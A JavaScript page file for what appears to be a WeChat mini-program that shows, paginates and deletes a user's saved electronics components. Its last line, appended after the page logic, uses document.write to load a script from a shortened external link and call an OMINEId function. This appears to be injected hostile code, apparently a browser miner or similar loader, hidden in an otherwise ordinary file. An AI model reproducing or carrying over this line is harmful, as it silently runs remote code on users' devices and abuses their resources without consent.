var t = getApp(),
  e = t.requirejs("core"),
  jq = t.requirejs("jquery");
t.requirejs("foxui");
Page({
  data: {
    icons: t.requirejs("icons"),
    pages: 1,
    loading: false,
    loaded: false,
    isedit: false,
    isCheckAll: false,
    show:"true",
    checkObj: {},
    total:"2",
    checkNum: 0,
    list: [
      // { merchid: "123", merchname: "", parameter: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", goodsid: "55", id: "122", isedit: "true", thumb: t.globalData.daxinImg + "/static/images/banner.png", fitemno: "ME6211C33M5G 盘装", marketprice: "52", productprice: "899", store: "55", salenum: "552", rangeprice: "0.55~0.899" }
      ]
  },
  onLoad: function (e) {
    //t.url(e);
    this.getList({page:1,pageSize:10});
  },
  onShow:function(e){
    //我的收藏
    
  },
  onReachBottom: function () {
    var pge = this.data.pages;
    pge++;
    if (pge >= 100) { return };
    if (!this.data.loaded) {
      this.getList({page:pge,pageSize:10});
      this.setData({
        pages: pge
      });
    } 
    //this.data.loaded || this.data.list.length == this.data.total || this.getList()
  },
  onPullDownRefresh: function () {
    this.setData({
      pages: 1,
      loaded: false,
      loading: true,
      list:[]
    });
    this.getList({ page: 1, pageSize: 10 });
    wx.stopPullDownRefresh();
  },
  getList: function (addObj,fn) {
    var _this = this;
    _this.setData({
      show: true
    });
    wx.showLoading({
      title: '加载中'
    });
    //我的收藏
    var senddata = {
      session_token: t.globalData.session_token,
         show_data: 'myCollect',
      // action: 'action',
      // p_id: 13

    };
    if (addObj)senddata = jq.extend(senddata,addObj);
      wx.request({
        url: t.globalData.daxin + "/memberCenter/my",
        data: senddata,
        method: "POST",
        success: function (res) {
          wx.hideLoading();
          //console.log(res);
          if (res.data.msg.indexOf("delete")>-1) {
            if (res.data.msg == "delete_success") {
              wx.showToast({
                title: '成功',
                icon: 'success',
                duration: 800,
                success: function () {
                  if (fn) fn();
                }
              });
            } else {
              wx.showToast({
                title: '删去失败',
                duration: 800,
                success: function () {

                }
              });
            }

            return;
          }
          if (res.data.statusCode >= 0 && res.data.data.list.length>0) {
            var lists=[];
            if (addObj.page > 1) lists=_this.data.list;
            var datalist = res.data.data.list;
            jq.each(datalist,function(index,value){
              value.store = value.store > 0 ? value.store:0;           
              value.thumb = (t.globalData.daxinImg + value.img);
              value.rangeprice = parseFloat(value.product_price[value.product_price.length - 1].unit_price).toFixed(2) + "~" + parseFloat(value.product_price[0].unit_price).toFixed(2);
              lists.push(value);
            });
            if (res.data.data.list.length<10){
              _this.setData({
                list: lists,
                loading: false,
                loaded:true
              });
            }else{
              _this.setData({
                list: lists,
                loaded:false,
                loading: true
              });
            }
            
          }else{
            if (addObj.page==1){
              _this.setData({
                total: 0
              });
              if (res.data.statusCode == -400){
                _this.setData({
                  total: 0,
                  list:[],
                  loading:false
                });
                return;
                };
              wx.showModal({
                title: '提示信息',
                content: res.data.msg,
                showCancel: false,
                success: function (res) {
                  if (res.confirm) {
                    //console.log('用户点击确定')
                  } else if (res.cancel) {
                    //console.log('用户点击取消')
                  }
                }
              })
            }else{
              _this.setData({
                loaded:true,
                loading:false
              });
            };
          }
        }
      })
  },
  itemClick: function (t) {
    var a = this,
      i = e.pdata(t).id,
      s = e.pdata(t).goodsid;
    if (a.data.isedit) {
      var c = a.data.checkObj,
        l = a.data.checkNum;
      c[i] ? (c[i] = false, l--) : (c[i] = true, l++);
      var o = true;
      for (var n in c)
        if (!c[n]) {
          o = false;
          break
        }
      a.setData({
        checkObj: c,
        isCheckAll: o,
        checkNum: l
      })
    } else
      wx.navigateTo({
        url: "/pages/goods/detail/index?id=" + i
      })
  },
  btnClick: function (t) {
    var a = this,
      i = t.currentTarget.dataset.action;
    if ("edit" == i) {
      var s = {};
      for (var c in this.data.list) {
        s[this.data.list[c].id] = false
      }
      a.setData({
        isedit: true,
        checkObj: s,
        isCheckAll: false
      })
    } else if ("delete" == i) {
      var s = a.data.checkObj; 
      var ids =[];
      jq.each(s,function(ind,val){
        if(val){
          ids.push(ind);
        }
      });     
      e.confirm("删除后不可恢复，确定要删除吗？", function () {
        a.getList({
          action:"delete",
          p_id: ids
        },function(){
          a.getList({page:1,pagSize:10});
        });
      })
    } else
      "finish" == i && a.setData({
        isedit: false,
        checkNum: 0
      })
  },
  checkAllClick: function () {
    var t = !this.data.isCheckAll,
      e = this.data.checkObj,
      a = {
        isCheckAll: t,
        checkObj: e
      };
    for (var i in e)
      a.checkObj[i] = !!t;
    a.checkNum = t ? this.data.list.length : 0,
      this.setData(a)
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
